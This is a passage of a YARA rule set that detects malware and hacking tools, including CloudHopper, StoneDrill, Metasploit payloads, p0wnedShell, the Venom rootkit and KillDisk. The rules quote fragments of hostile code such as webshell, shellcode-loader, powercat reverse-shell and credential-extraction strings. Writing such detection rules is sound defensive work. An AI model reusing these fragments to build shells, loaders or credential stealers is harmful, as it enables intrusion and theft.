      $s7 = "zok]\\\\\\ZZYYY666564444" fullword ascii
      $s11 = "InvokeMainViaCRT" fullword ascii
      $s12 = ".?AVAES@@" fullword ascii
      $op1 = { b6 4c 06 f5 32 cf 88 4c 06 05 0f b6 4c 06 f9 32 } 
      $op2 = { 06 fc eb 03 8a 5e f0 85 c0 74 05 8a 0c 06 eb 03 } 
      $op3 = { 7e f8 85 c0 74 06 8a 74 06 08 eb 03 8a 76 fc 85 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( all of ( $s* ) and 1 of ( $op* ) ) or all of ( $op* ) ) or ( 5 of them )
}

rule OpCloudHopper_Dropper_1_RID3000 : DEMO FILE MAL {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:21:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "411571368804578826b8f24f323617f51b068809b1c769291b21125860dc3f4e"
      tags = "DEMO, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "{\\version2}{\\edmins0}{\\nofpages1}{\\nofwords11}{\\nofchars69}{\\*\\company google}{\\nofcharsws79}{\\vern24611}{\\*\\password" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5c7b and filesize < 700KB and all of them )
}

rule OpCloudHopper_Malware_4_RID2FF0 : DEMO EXE FILE MAL {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:18:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-01-06"
      hash1 = "ae6b45a92384f6e43672e617c53a44225e2944d66c1ffb074694526386074145"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s6 = "operator \"\" " fullword ascii
      $s9 = "InvokeMainViaCRT" fullword ascii
      $s10 = ".?AVAES@@" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them )
}

rule OpCloudHopper_Malware_6_RID2FF2 : DEMO EXE FILE MAL {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:18:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "aabebea87f211d47f72d662e2449009f83eac666d81b8629cf57219d0ce31af6"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "YDNCCOVZKXGRVQPOBRNXXQVNQYXBBCONCOQEGYELIRBEYOVODGXCOXTHXPCXNGUCHRVWKKZSYQMAOWWGHRSPRGSEUWYMEFZHRTHO" fullword ascii
      $s2 = "psychiatry.dat" fullword ascii
      $s3 = "meekness.lnk" fullword ascii
      $s4 = "SOFTWARE\\EGGORG" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )
}

rule OpCloudHopper_Malware_7_RID2FF3 : DEMO EXE FILE MAL {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:19:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "44a7bea8a08f4c2feb74c6a00ff1114ba251f3dc6922ea5ffab9e749c98cbdce"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "jepsjepsjepsjepsjepsjepsjepsjepsjepsjeps" fullword ascii
      $x2 = "extOextOextOextO" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule OpCloudHopper_Malware_11_RID301E : DEMO EXE FILE MAL {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:26:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a80f6c57f772f20d63021c8971a280c19e8eafe7cc7088344c598d84026dda15"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "IOGVWDWCXZVRHTE" fullword ascii
      $op1 = { c9 c3 56 6a 00 8b f1 6a 64 e8 dd 34 00 00 c7 06 } 
      $op2 = { 68 38 00 41 00 68 34 00 41 00 e8 d3 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )
}

rule Mimipenguin_SH_RID2C8D : DEMO HKTL LINUX SCRIPT T1003 {
   meta:
      description = "Detects Mimipenguin Password Extractor - Linux"
      author = "Florian Roth"
      reference = "https://github.com/huntergregal/mimipenguin"
      date = "2017-04-01 09:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, LINUX, SCRIPT, T1003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$(echo $thishash | cut -d'$' -f 3)" ascii
      $s2 = "ps -eo pid,command | sed -rn '/gnome\\-keyring\\-daemon/p' | awk" ascii
      $s3 = "MimiPenguin Results:" ascii
   condition: 
      1 of them
}

rule StoneDrill_ntssrvr32_RID2EF7 : APT DEMO EXE FILE MIDDLE_EAST {
   meta:
      description = "Detects malware from StoneDrill threat report"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/"
      date = "2017-03-07 11:37:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-01-20"
      hash1 = "394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b"
      tags = "APT, DEMO, EXE, FILE, MIDDLE_EAST"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "g\\system32\\" wide
      $s2 = "ztvttw" fullword wide
      $s3 = "lwizvm" fullword ascii
      $op1 = { 94 35 77 73 03 40 eb e9 } 
      $op2 = { 80 7c 41 01 00 74 0a 3d } 
      $op3 = { 74 0a 3d 00 94 35 77 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 3 of them )
}

rule StoneDrill_RID2B11 : APT DEMO EXE FILE MIDDLE_EAST {
   meta:
      description = "Detects malware from StoneDrill_RID2B11 threat report"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/"
      date = "2017-03-07 08:50:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2bab3716a1f19879ca2e6d98c518debb107e0ed8e1534241f7769193807aac83"
      hash2 = "62aabce7a5741a9270cddac49cd1d715305c1d0505e620bbeaec6ff9b6fd0260"
      hash3 = "69530d78c86031ce32583c6800f5ffc629acacb18aac4c8bb5b0e915fc4cc4db"
      tags = "APT, DEMO, EXE, FILE, MIDDLE_EAST"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "C-Dlt-C-Trsh-T.tmp" fullword wide
      $x2 = "C-Dlt-C-Org-T.vbs" fullword wide
      $s1 = "Hello dear" fullword ascii
      $s2 = "WRZRZRAR" fullword ascii
      $opa1 = { 66 89 45 d8 6a 64 ff } 
      $opa2 = { 8d 73 01 90 0f bf 51 fe } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of ( $x* ) or ( all of ( $op* ) and all of ( $s* ) )
}

rule StoneDrill_VBS_1_RID2CEB : APT DEMO MIDDLE_EAST SCRIPT {
   meta:
      description = "Detects malware from StoneDrill threat report"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/"
      date = "2017-03-07 10:09:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0f4d608a87e36cb0dbf1b2d176ecfcde837070a2b2a049d532d3d4226e0c9587"
      tags = "APT, DEMO, MIDDLE_EAST, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "wmic /NameSpace:\\\\root\\default Class StdRegProv Call SetStringValue hDefKey = \"&H80000001\" sSubKeyName = \"Software\\Micros" ascii
      $x2 = "ping 1.0.0.0 -n 1 -w 20000 > nul" fullword ascii
      $s1 = "WshShell.CopyFile \"%COMMON_APPDATA%\\Chrome\\" ascii
      $s2 = "WshShell.DeleteFile \"%temp%\\" ascii
      $s3 = "WScript.Sleep(10 * 1000)" fullword ascii
      $s4 = "Set WshShell = CreateObject(\"Scripting.FileSystemObject\") While WshShell.FileExists(\"" ascii
      $s5 = " , \"%COMMON_APPDATA%\\Chrome\\" ascii
   condition: 
      ( filesize < 1KB and 1 of ( $x* ) or 2 of ( $s* ) )
}

rule Kriskynote_Mar17_1_RID2DBB : DEMO EXE FILE MAL {
   meta:
      description = "Detects Kriskynote Malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-03 10:44:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a19c4b615aa54207604b181873e614d84126b639fee2cce3ca9d5bd863f6f577"
      hash2 = "62b41db0bf63fa45a2c2b0f5df8c2209a5d96bf2bddf82749595c66d30b7ec61"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "gzwrite64" fullword ascii
      $opa1 = { e8 6b fd ff ff 83 f8 ff 74 65 83 7b 28 00 74 42 } 
      $opb1 = { 8a 04 08 8b 8e a4 16 00 00 88 44 24 0c 66 c7 04 } 
      $opb2 = { 89 4e 6c 89 46 74 e9 ad fc ff ff 8b 46 68 85 c0 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and $s1 and ( $opa1 or all of ( $opb* ) )
}

rule Kriskynote_Mar17_2_RID2DBC : DEMO EXE FILE MAL {
   meta:
      description = "Detects Kriskynote Malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-03 10:44:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cb9a2f77868b28d98e4f9c1b27b7242fec2f2abbc91bfc21fe0573e472c5dfcb"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "fgjfcn8456fgjhfg89653wetwts" fullword ascii
      $op0 = { 33 c0 80 34 30 03 40 3d e6 21 00 00 72 f4 b8 e6 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them )
}

rule PHP_Webshell_1_Feb17_RID2DF2 : ANOMALY DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects a simple cloaked PHP web shell"
      author = "Florian Roth"
      reference = "https://isc.sans.edu/diary/Analysis+of+a+Simple+PHP+Backdoor/22127"
      date = "2017-02-28 10:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "ANOMALY, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $h1 = "<?php ${\"\\x" ascii
      $x1 = "\";global$auth;function sh_decrypt_phase($data,$key){${\"" ascii
      $x2 = "global$auth;return sh_decrypt_phase(sh_decrypt_phase($" ascii
      $x3 = "]}[\"\x64\"]);}}echo " ascii
      $x4 = "\"=>@phpversion(),\"\\x" ascii
      $s1 = "$i=Array(\"pv\"=>@phpversion(),\"sv\"" ascii
      $s3 = "$data = @unserialize(sh_decrypt(@base64_decode($data),$data_key));" ascii
   condition: 
      uint32 ( 0 ) == 0x68703f3c and ( $h1 at 0 and 1 of them ) or 2 of them
}

rule Msfpayloads_msf_RID2D39 : APT DEMO METASPLOIT SCRIPT {
   meta:
      description = "Metasploit Payloads - file msf.sh"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:22:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2022-08-18"
      hash1 = "320a01ec4e023fb5fbbaef963a2b57229e4f918847e5a49c7a3f631cb556e96c"
      tags = "APT, DEMO, METASPLOIT, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "export buf=\\" ascii
   condition: 
      filesize < 5MB and $s1
}

rule Msfpayloads_msf_5_RID2DCD : APT DEMO METASPLOIT {
   meta:
      description = "Metasploit Payloads - file msf.msi"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:47:21"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "7a6c66dfc998bf5838993e40026e1f400acd018bde8d4c01ef2e2e8fba507065"
      tags = "APT, DEMO, METASPLOIT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "required to install Foobar 1.0." fullword ascii
      $s2 = "Copyright 2009 The Apache Software Foundation." fullword wide
      $s3 = "{50F36D89-59A8-4A40-9689-8792029113AC}" fullword ascii
   condition: 
      all of them
}

rule Msfpayloads_msf_6_RID2DCE : APT DEMO METASPLOIT SCRIPT {
   meta:
      description = "Metasploit Payloads - file msf.vbs"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:47:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8d6f55c6715c4a2023087c3d0d7abfa21e31a629393e4dc179d31bb25b166b3f"
      tags = "APT, DEMO, METASPLOIT, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "= CreateObject(\"Wscript.Shell\")" fullword ascii
      $s2 = "= CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s3 = ".GetSpecialFolder(2)" ascii
      $s4 = ".Write Chr(CLng(\"" ascii
      $s5 = "= \"4d5a90000300000004000000ffff00" ascii
      $s6 = "For i = 1 to Len(" ascii
      $s7 = ") Step 2" ascii
   condition: 
      5 of them
}

rule Msfpayloads_msf_7_RID2DCF : APT DEMO METASPLOIT SCRIPT {
   meta:
      description = "Metasploit Payloads - file msf.vba"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:47:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "425beff61a01e2f60773be3fcb74bdfc7c66099fe40b9209745029b3c19b5f2f"
      tags = "APT, DEMO, METASPLOIT, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal" ascii
      $s2 = "= VirtualAlloc(0, UBound(Tsw), &H1000, &H40)" fullword ascii
      $s3 = "= RtlMoveMemory(" ascii
   condition: 
      all of them
}

rule Ysoserial_Payload_Spring1_RID30F8 : DEMO EXPLOIT T1203 T1566_001 {
   meta:
      description = "Ysoserial Payloads - file Spring1.bin"
      author = "Florian Roth"
      reference = "https://github.com/frohoff/ysoserial"
      date = "2017-02-04 13:02:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2020-11-30"
      hash1 = "bf9b5f35bc1556d277853b71da24faf23cf9964d77245018a0fdf3359f3b1703"
      hash2 = "9c0be107d93096066e82a5404eb6829b1daa6aaa1a7b43bcda3ddac567ce715a"
      hash3 = "8cfa85c16d37fb2c38f277f39cafb6f0c0bd7ee62b14d53ad1dd9cb3f4b25dd8"
      tags = "DEMO, EXPLOIT, T1203, T1566_001"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "ysoserial/Pwner" ascii
   condition: 
      1 of them
}

rule GoogleBot_UserAgent_RID2E80 : DEMO EXE FILE MAL {
   meta:
      description = "Detects the GoogleBot UserAgent String in an Executable"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-27 11:17:11"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii
      $fp1 = "McAfee, Inc." wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and $x1 and not 1 of ( $fp* ) )
}

rule Greenbug_Malware_1_RID2DF8 : DEMO EXE FILE MAL MIDDLE_EAST {
   meta:
      description = "Detects Malware from Greenbug Incident"
      author = "Florian Roth"
      reference = "https://community.broadcom.com/home"
      date = "2017-01-25 10:54:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "dab460a0b73e79299fbff2fa301420c1d97a36da7426acc0e903c70495db2b76"
      tags = "DEMO, EXE, FILE, MAL, MIDDLE_EAST"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "vailablez" fullword ascii
      $s2 = "Sfouglr" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )
}

rule p0wnedPowerCat_RID2C84 : DEMO FILE HKTL {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedPowerCat_RID2C84.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 09:52:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6a3ba991d3b5d127c4325bc194b3241dde5b3a5853b78b4df1bce7cbe87c0fdf"
      tags = "DEMO, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Now if we point Firefox to http://127.0.0.1" fullword ascii
      $x2 = "powercat -l -v -p" fullword ascii
      $x3 = "P0wnedListener" fullword ascii
      $x4 = "EncodedPayload.bat" fullword ascii
      $x5 = "powercat -c " fullword ascii
      $x6 = "Program.P0wnedPath()" ascii
      $x7 = "Invoke-PowerShellTcpOneLine" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7375 and filesize < 150KB and 1 of them ) or ( 2 of them )
}

rule p0wnedExploits_RID2CB7 : DEMO HKTL T1033 {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedExploits_RID2CB7.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 10:01:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "54548e7848e742566f5596d8f02eca1fd2cbfeae88648b01efb7bab014b9301b"
      tags = "DEMO, HKTL, T1033"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Pshell.RunPSCommand(Whoami);" fullword ascii
      $x2 = "If succeeded this exploit should popup a System CMD Shell" fullword ascii
   condition: 
      all of them
}

rule p0wnedListenerConsole_RID2F78 : DEMO HKTL T1055_002 {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedListenerConsole_RID2F78.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 11:58:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d2d84e65fad966a8556696fdaab5dc8110fc058c9e9caa7ea78aa00921ae3169"
      tags = "DEMO, HKTL, T1055_002"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Invoke_ReflectivePEInjection" fullword wide
      $x5 = "p0wnedShell> " fullword wide
      $x6 = "Resources.Get_PassHashes" fullword wide
      $s7 = "Invoke_CredentialsPhish" fullword wide
      $s8 = "Invoke_Shellcode" fullword wide
      $s9 = "Resources.Invoke_TokenManipulation" fullword wide
      $s10 = "Resources.Port_Scan" fullword wide
      $s20 = "Invoke_PowerUp" fullword wide
   condition: 
      1 of them
}

rule p0wnedBinaries_RID2C8C : DEMO HKTL {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedBinaries_RID2C8C.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 09:53:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "fd7014625b58d00c6e54ad0e587c6dba5d50f8ca4b0f162d5af3357c2183c7a7"
      tags = "DEMO, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9" ascii
      $x2 = "wpoWAB+LCAAAAAAABADs/QeyK7uOBYhORUNIenL+E2vBA0ympH3erY4f8Tte3TpbUiY9YRbcGK91vVKtr+tV3v/B/yr/m1vD/+DvNOVb+V/f" ascii
      $x3 = "mo0MAB+LCAAAAAAABADsXQl24zqu3YqXII6i9r+xJ4AACU4SZcuJnVenf/9OxbHEAcRwcQGu62NbHsrax/Iw+3/hP5b+VzuH/4WfVeDf8n98" ascii
      $x4 = "LE4CAB+LCAAAAAAABADsfQmW2zqu6Fa8BM7D/jf2hRmkKNuVm/Tt9zunkipb4giCIGb2/prhFUt5hVe+/sNP4b+pVvwPn+OQp/LT9ge/+" ascii
      $x5 = "XpMCAB+LCAAAAAAABADsfQeWIzmO6FV0hKAn73+xL3iAwVAqq2t35r/tl53VyhCDFoQ3Y7zW9Uq1vq5Xef/CT+X/59bwFz6nKU/lp+8P/" ascii
      $x6 = "STwAAB+LCAAAAAAABADtWwmy6yoO3YqXgJjZ/8ZaRwNgx/HNfX/o7qqUkxgzCM0SmLR2jHBQzkc4En9xZbvHUuSLMnWv9ateK/70ilStR" ascii
      $x7 = "namespace p0wnedShell" fullword ascii
   condition: 
      1 of them
}

rule p0wnedAmsiBypass_RID2D5B : DEMO HKTL {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedAmsiBypass_RID2D5B.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 10:28:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "345e8e6f38b2914f4533c4c16421d372d61564a4275537e674a2ac3360b19284"
      tags = "DEMO, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Program.P0wnedPath()" fullword ascii
      $x2 = "namespace p0wnedShell" fullword ascii
      $x3 = "H4sIAAAAAAAEAO1YfXRUx3WflXalFazQgiVb5nMVryzxIbGrt/rcFRZIa1CQYEFCQnxotUhP2pX3Q337HpYotCKrPdbmoQQnkOY0+BQCNKRpe" ascii
   condition: 
      1 of them
}

rule p0wnedShell_outputs_RID2EDA : DEMO HKTL {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - from files p0wnedShell.cs, p0wnedShell.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 11:32:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e1f35310192416cd79e60dba0521fc6eb107f3e65741c344832c46e9b4085e60"
      tags = "DEMO, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[+] For this attack to succeed, you need to have Admin privileges." fullword ascii
      $s2 = "[+] This is not a valid hostname, please try again" fullword ascii
      $s3 = "[+] First return the name of our current domain." fullword ascii
   condition: 
      1 of them
}

rule EquationGroup_EquationDrug_Gen_4_RID33A7 : APT DEMO EXE FILE GEN {
   meta:
      description = "EquationGroup Malware - file PC_Level4_flav_dll"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/"
      date = "2017-01-13 14:57:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "227faeb770ba538fb85692b3dfcd00f76a0a5205d1594bd0969a1e535ee90ee1"
      tags = "APT, DEMO, EXE, FILE, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 11 8b da 23 df 8d 1c 9e c1 fb 02 33 da 23 df 33 } 
      $op2 = { c3 0c 57 8b 3b eb 27 8b f7 83 7e 08 00 8b 3f 74 } 
      $op3 = { 00 0f b7 5e 14 8d 5c 33 18 8b c3 2b 45 08 50 ff } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_EquationDrug_msgkd_RID3410 : APT DEMO EXE FILE {
   meta:
      description = "EquationGroup Malware - file msgkd.ex_"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/"
      date = "2017-01-13 15:14:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "25eec68fc9f0d8d1b5d72c9eae7bee29035918e9dcbeab13e276dec4b2ad2a56"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "KEysud" fullword ascii
      $s2 = "XWWWPWS" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )
}

rule Venom_Rootkit_RID2C61 : APT DEMO LINUX T1014 {
   meta:
      description = "Venom Linux Rootkit"
      author = "Florian Roth"
      reference = "https://security.web.cern.ch/security/venom.shtml"
      date = "2017-01-12 09:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, LINUX, T1014"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "%%VENOM%CTRL%MODE%%" ascii fullword
      $s2 = "%%VENOM%OK%OK%%" ascii fullword
      $s3 = "%%VENOM%WIN%WN%%" ascii fullword
      $s4 = "%%VENOM%AUTHENTICATE%%" ascii fullword
      $s5 = ". entering interactive shell" ascii fullword
      $s6 = ". processing ltun request" ascii fullword
      $s7 = ". processing rtun request" ascii fullword
      $s8 = ". processing get request" ascii fullword
      $s9 = ". processing put request" ascii fullword
      $s10 = "venom by mouzone" ascii fullword
      $s11 = "justCANTbeSTOPPED" ascii fullword
   condition: 
      filesize < 4000KB and 2 of them
}

rule TeleBots_IntercepterNG_RID2FAC : APT DEMO EXE FILE G0034 {
   meta:
      description = "Detects TeleBots malware - IntercepterNG"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"
      date = "2016-12-14 12:07:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "5f9fef7974d37922ac91365588fbe7b544e13abbbde7c262fe30bade7026e118"
      tags = "APT, DEMO, EXE, FILE, G0034"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Usage: %s iface_num\\dump [mode] [w] [-gw] [-t1 ip]" fullword ascii
      $s2 = "Target%d found: %s - [%.2X-%.2X-%.2X-%.2X-%.2X-%.2X]" fullword ascii
      $s3 = "3: passwords + files, no arp poison" fullword ascii
      $s4 = "IRC Joining Keyed Channel intercepted" fullword ascii
      $s5 = "-tX - set target ip" fullword ascii
      $s6 = "w - save session to .pcap dump" fullword ascii
      $s7 = "example: %s 1 1 -gw 192.168.1.1 -t1 192.168.1.3 -t2 192.168.1.5" fullword ascii
      $s8 = "ORACLE8 DES Authorization intercepted" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of them ) or ( 4 of them )
}

rule TeleBots_KillDisk_1_RID2E39 : APT DEMO EXE FILE G0034 {
   meta:
      description = "Detects TeleBots malware - KillDisk"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"
      date = "2016-12-14 11:05:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "8246f709efa922a485e1ca32d8b0d10dc752618e8b3fce4d3dd58d10e4a6a16d"
      tags = "APT, DEMO, EXE, FILE, G0034"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Plug-And-Play Support Service" fullword wide
      $s2 = " /c \"echo Y|" fullword wide
      $s3 = "-set=06.12.2016#09:30 -est=1410" fullword ascii
      $s4 = "%d.%d.%d#%d:%d" fullword ascii
      $s5 = " /T /C /G " fullword wide
      $s6 = "[-] > %ls" fullword wide
      $s7 = "[+] > %ls" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 4 of them ) or ( 6 of them )
}

rule TeleBots_KillDisk_2_RID2E3A : APT DEMO EXE FILE G0034 {
   meta:
      description = "Detects TeleBots malware - KillDisk"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"
      date = "2016-12-14 11:05:31"
      score = 75
